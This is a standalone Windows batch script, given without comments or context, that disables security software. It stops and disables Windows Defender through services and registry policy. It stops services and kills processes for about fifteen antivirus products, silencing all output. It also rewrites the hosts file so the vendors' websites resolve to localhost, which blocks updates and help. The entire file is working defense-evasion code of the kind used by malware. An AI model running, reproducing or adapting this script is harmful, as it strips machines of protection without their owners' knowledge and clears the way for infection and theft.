@echo off
net stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
net stop avast! Antivirus >nul 2>&1
sc config avast! Antivirus start= disabled >nul 2>&1
net stop avgwd >nul 2>&1
sc config avgwd start= disabled >nul 2>&1
net stop bdredline >nul 2>&1
sc config bdredline start= disabled >nul 2>&1
net stop klif >nul 2>&1
sc config klif start= disabled >nul 2>&1
net stop SymCorpUI >nul 2>&1
sc config SymCorpUI start= disabled >nul 2>&1
net stop McAfeeFramework >nul 2>&1
sc config McAfeeFramework start= disabled >nul 2>&1
net stop ekrn >nul 2>&1
sc config ekrn start= disabled >nul 2>&1
net stop TmProxy >nul 2>&1
sc config TmProxy start= disabled >nul 2>&1
net stop Sophos AutoUpdate Service >nul 2>&1
sc config Sophos AutoUpdate Service start= disabled >nul 2>&1
net stop MBAMService >nul 2>&1
sc config MBAMService start= disabled >nul 2>&1
net stop WRSVC >nul 2>&1
sc config WRSVC start= disabled >nul 2>&1
net stop avguard >nul 2>&1
sc config avguard start= disabled >nul 2>&1
net stop PSANHost >nul 2>&1
sc config PSANHost start= disabled >nul 2>&1
net stop FSMA >nul 2>&1
sc config FSMA start= disabled >nul 2>&1
net stop cmdagent >nul 2>&1
sc config cmdagent start= disabled >nul 2>&1
taskkill /f /im avastui.exe >nul 2>&1
taskkill /f /im avgui.exe >nul 2>&1
taskkill /f /im bdagent.exe >nul 2>&1
taskkill /f /im kav.exe >nul 2>&1
taskkill /f /im norton.exe >nul 2>&1
taskkill /f /im mcui.exe >nul 2>&1
taskkill /f /im egui.exe >nul 2>&1
taskkill /f /im tmproxy.exe >nul 2>&1
taskkill /f /im sophos*.exe >nul 2>&1
taskkill /f /im mbam.exe >nul 2>&1
taskkill /f /im wrctrl.exe >nul 2>&1
taskkill /f /im avira*.exe >nul 2>&1
taskkill /f /im panda*.exe >nul 2>&1
taskkill /f /im fs*.exe >nul 2>&1
taskkill /f /im comodo*.exe >nul 2>&1

set "hostsfile=%windir%\System32\drivers\etc\hosts"
findstr /v /i "avast.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "avg.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "bitdefender.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "kaspersky.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "norton.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "symantec.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "mcafee.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "eset.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "trendmicro.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "sophos.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "malwarebytes.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "webroot.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "avira.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "pandasecurity.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "f-secure.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1
findstr /v /i "comodo.com" %hostsfile% > temp.txt
move /y temp.txt %hostsfile% >nul 2>&1

echo. >> %hostsfile%
echo 127.0.0.1 avast.com >> %hostsfile%
echo 127.0.0.1 www.avast.com >> %hostsfile%
echo 127.0.0.1 avg.com >> %hostsfile%
echo 127.0.0.1 www.avg.com >> %hostsfile%
echo 127.0.0.1 bitdefender.com >> %hostsfile%
echo 127.0.0.1 www.bitdefender.com >> %hostsfile%
echo 127.0.0.1 kaspersky.com >> %hostsfile%
echo 127.0.0.1 www.kaspersky.com >> %hostsfile%
echo 127.0.0.1 norton.com >> %hostsfile%
echo 127.0.0.1 www.norton.com >> %hostsfile%
echo 127.0.0.1 symantec.com >> %hostsfile%
echo 127.0.0.1 www.symantec.com >> %hostsfile%
echo 127.0.0.1 mcafee.com >> %hostsfile%
echo 127.0.0.1 www.mcafee.com >> %hostsfile%
echo 127.0.0.1 eset.com >> %hostsfile%
echo 127.0.0.1 www.eset.com >> %hostsfile%
echo 127.0.0.1 trendmicro.com >> %hostsfile%
echo 127.0.0.1 www.trendmicro.com >> %hostsfile%
echo 127.0.0.1 sophos.com >> %hostsfile%
echo 127.0.0.1 www.sophos.com >> %hostsfile%
echo 127.0.0.1 malwarebytes.com >> %hostsfile%
echo 127.0.0.1 www.malwarebytes.com >> %hostsfile%
echo 127.0.0.1 webroot.com >> %hostsfile%
echo 127.0.0.1 www.webroot.com >> %hostsfile%
echo 127.0.0.1 avira.com >> %hostsfile%
echo 127.0.0.1 www.avira.com >> %hostsfile%
echo 127.0.0.1 pandasecurity.com >> %hostsfile%
echo 127.0.0.1 www.pandasecurity.com >> %hostsfile%
echo 127.0.0.1 f-secure.com >> %hostsfile%
echo 127.0.0.1 www.f-secure.com >> %hostsfile%
echo 127.0.0.1 comodo.com >> %hostsfile%
echo 127.0.0.1 www.comodo.com >> %hostsfile%
ipconfig /flushdns >nul 2>&1
pause
exit /b